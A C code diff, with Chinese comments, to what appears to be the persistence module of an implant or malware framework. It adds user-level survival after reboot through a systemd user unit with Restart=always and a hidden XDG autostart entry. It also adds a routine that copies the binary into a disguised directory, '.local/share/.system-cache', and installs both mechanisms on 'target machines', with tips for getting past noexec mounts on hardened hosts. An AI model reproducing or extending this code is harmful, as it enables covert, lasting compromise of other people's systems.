@@ -163,6 +163,30 @@ static size_t gen_lkm(const char *arg, char *out, size_t cap) {
         "沙盒内 UNVERIFIED_KERNEL");
 }
 
+/* ---------- 用户级驻留载荷 ---------- */
+
+/* WantedBy 必须是 default.target，不是 multi-user.target。
+ * 用户级 systemd 实例没有 multi-user.target——写成它会让 enable 报
+ * "Unit ... not found" 或静默不生效，而单元文件本身完全合法、肉眼无异常。
+ * 这是用户级与系统级单元最易错的一处差异。 */
+static size_t gen_user_systemd(const char *arg, char *out, size_t cap) {
+    return (size_t)snprintf(out, cap,
+        "[Unit]\nDescription=%s\n\n[Service]\nExecStart=%s\n"
+        "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n",
+        g_svc_name, arg ? arg : "/bin/true");
+}
+
+/* XDG 桌面自启条目。Host= 需为真值；Hidden=false 与
+ * X-GNOME-Autostart-enabled=true 都必须显式给出——部分桌面环境
+ * （GNOME 系）只在两者同时为真时才加载，缺一即静默不启动。 */
+static size_t gen_autostart(const char *arg, char *out, size_t cap) {
+    return (size_t)snprintf(out, cap,
+        "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\n"
+        "Hidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n"
+        "Comment=%s\n",
+        g_svc_name, arg ? arg : "/bin/true", g_svc_name);
+}
+
 static const persist_desc_t descs[] = {
     { PERSIST_CRON,        "cron",         PERSIST_PLAT_NIX, gen_cron },
     { PERSIST_SYSTEMD,     "systemd",      PERSIST_PLAT_NIX, gen_systemd },
@@ -174,6 +198,8 @@ static const persist_desc_t descs[] = {
     { PERSIST_WMI,         "wmi_event",    PERSIST_PLAT_WIN, gen_wmi },
     { PERSIST_SERVICE,     "win_service",  PERSIST_PLAT_WIN, gen_service },
     { PERSIST_LKM,         "lkm",          3,                gen_lkm },
+    { PERSIST_USER_SYSTEMD, "user_systemd", PERSIST_PLAT_NIX, gen_user_systemd },
+    { PERSIST_AUTOSTART,    "autostart",    PERSIST_PLAT_NIX, gen_autostart },
 };
 
 size_t persist_method_count(void) { return sizeof descs / sizeof descs[0]; }
@@ -217,6 +243,16 @@ static int artifact_path(persist_method_t m, const char *root_prefix,
             return 0;
         case PERSIST_LDPRELOAD:
             snprintf(out, cap, "%s/etc/ld.so.preload", rp);
+            if (needs_marker) *needs_marker = 0;
+            return 0;
+        case PERSIST_USER_SYSTEMD:
+            snprintf(out, cap, "%s%s/.config/systemd/user/%s.service",
+                     rp, home, g_svc_name);
+            if (needs_marker) *needs_marker = 0;
+            return 0;
+        case PERSIST_AUTOSTART:
+            snprintf(out, cap, "%s%s/.config/autostart/%s.desktop",
+                     rp, home, g_svc_name);
             if (needs_marker) *needs_marker = 0;
             return 0;
         default:
@@ -461,6 +497,74 @@ int persist_linux_ensure(const char *root_prefix,
      * 因此以"最终已装机制总数"为准：0 项 = 失败；否则按是否有新增分
      * 0（新装）/ 1（已驻留，幂等）。
      */
+    int total = 0;
+    for (size_t i = 0; i < nms; i++)
+        if (persist_installed(root_prefix, ms[i]) == 1) total++;
+
+    if (total == 0) return -1;
+    return (newly > 0) ? 0 : 1;
+}
+
+int persist_user_ensure(const char *root_prefix,
+                        char *out_bin_path, size_t cap,
+                        int *out_methods, size_t nm_methods)
+{
+    static const persist_method_t ms[] = { PERSIST_USER_SYSTEMD, PERSIST_AUTOSTART };
+    const size_t nms = sizeof ms / sizeof ms[0];
+
+    /*
+     * HOME 必须在安装阶段就被确认可用。
+     *
+     * 用户级驻留的落点全在 $HOME 下。HOME 缺失（cron/systemd 环境常见：
+     * 系统级服务不设 HOME，或设为 /nonexistent）或不可写时，两项机制都不
+     * 可能装上——此时若仍返回 0/1，故障会推迟到目标机重启、守护没起来才
+     * 被发现，而那已经无法补救。安装阶段就失败是可诊断的，重启后没起来
+     * 不是。
+     */
+    const char *home = getenv("HOME");
+    if (!home || !*home) home = "/root";
+    {
+        char probe[512];
+        snprintf(probe, sizeof probe, "%s%s", root_prefix ? root_prefix : "", home);
+        struct stat st;
+        if (stat(probe, &st) != 0) {
+            if (mkdir_p(probe, 0700) != 0) return -1;
+        } else if (!(st.st_mode & S_IWUSR)) {
+            return -1;
+        }
+    }
+
+    int already = 0;
+    for (size_t i = 0; i < nms; i++)
+        if (persist_installed(root_prefix, ms[i]) == 1) already++;
+
+    /* 落点必须在用户可写区。用 /var/tmp 会在部分加固目标上被 noexec 挂载
+     * 挡掉，而 $HOME 下默认可执行，且与非 root 身份一致（不会试图写
+     * 只有 root 可写的系统目录）。 */
+    char drop_dir[512];
+    snprintf(drop_dir, sizeof drop_dir, "%s/.local/share/.system-cache", home);
+
+    if (persist_drop_self(root_prefix, drop_dir, out_bin_path, cap) != 0)
+        return -1;
+
+    int newly = 0;
+    for (size_t i = 0; i < nms; i++) {
+        if (persist_installed(root_prefix, ms[i]) == 1) {
+            if (out_methods && i < nm_methods) out_methods[i] = 1;
+            continue;
+        }
+        if (persist_install(ms[i], root_prefix, out_bin_path) == 0) {
+            newly++;
+            if (out_methods && i < nm_methods) out_methods[i] = 1;
+        } else if (out_methods && i < nm_methods) {
+            out_methods[i] = 0;
+        }
+    }
+    if (already == (int)nms) return 1;
+
+    /* 与 persist_linux_ensure 同语义：只有一项都没装上才算真失败。
+     * 用户级驻留下任一机制生效即达成"登录后自启"，把部分成功判成失败
+     * 会让调用方拒绝运行——明明已经驻留，却因另一项可选机制而退出。 */
     int total = 0;
     for (size_t i = 0; i < nms; i++)
         if (persist_installed(root_prefix, ms[i]) == 1) total++;
